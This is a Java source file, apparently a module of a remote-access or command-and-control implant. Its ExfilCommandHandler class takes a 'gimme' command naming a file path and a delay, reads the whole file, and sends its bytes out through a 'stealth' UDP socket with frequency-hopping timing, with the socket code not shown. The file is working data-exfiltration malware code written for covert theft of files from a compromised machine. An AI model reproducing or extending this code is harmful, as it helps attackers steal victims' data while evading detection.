package exfilfunctions;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;

import networking.MultiserviceStealthUDPSocket;

public class ExfilCommandHandler {
	public ExfilCommandHandler(){
		
	}
	
	public boolean checkExfil(String input){
		if(input.startsWith("gimme")){
			return true;
		}
		else{
			return false;
		}
	}

	public String handleExfil(String command, MultiserviceStealthUDPSocket msus) {
		try{
			System.out.println("[+] Exfil Begins");
			System.out.println("[d] Proceessing Command: "+command);
			command=command.substring(0,command.length()-command.length()%3);
			String path = command.split("\"")[1];
			int waitTime = Integer.parseInt(command.substring(command.lastIndexOf('\"')+2));
			System.out.println("[d] Determined Path: ");
			System.out.println(path);
			System.out.println("[d] Wait time (ms): "+waitTime );
			//String[] commandParts = command.split(" ");
			//String path = commandParts[1];
			//int waitTime = Integer.parseInt(commandParts[2]);
			FileInputStream fis = new FileInputStream(new File(path));
			int c;
			ArrayList<Byte> exfilBytes = new ArrayList<Byte>();
			while ((c = fis.read()) != -1) {
				exfilBytes.add((byte) c);
	        }
			byte[] exfilByteArray = new byte[exfilBytes.size()];
			for(int i = 0; i < exfilByteArray.length; i++){
				exfilByteArray[i]=exfilBytes.get(i);
			}
			System.out.println("[+] Data Read Complete");
			msus.sendHoppingStealthMessage(exfilByteArray, waitTime);
			return "Exfil Success!";
			
		}catch(Exception e){
			e.printStackTrace();
			return "Exfil Failed! \n"+e.toString();
		}
		
	}
}
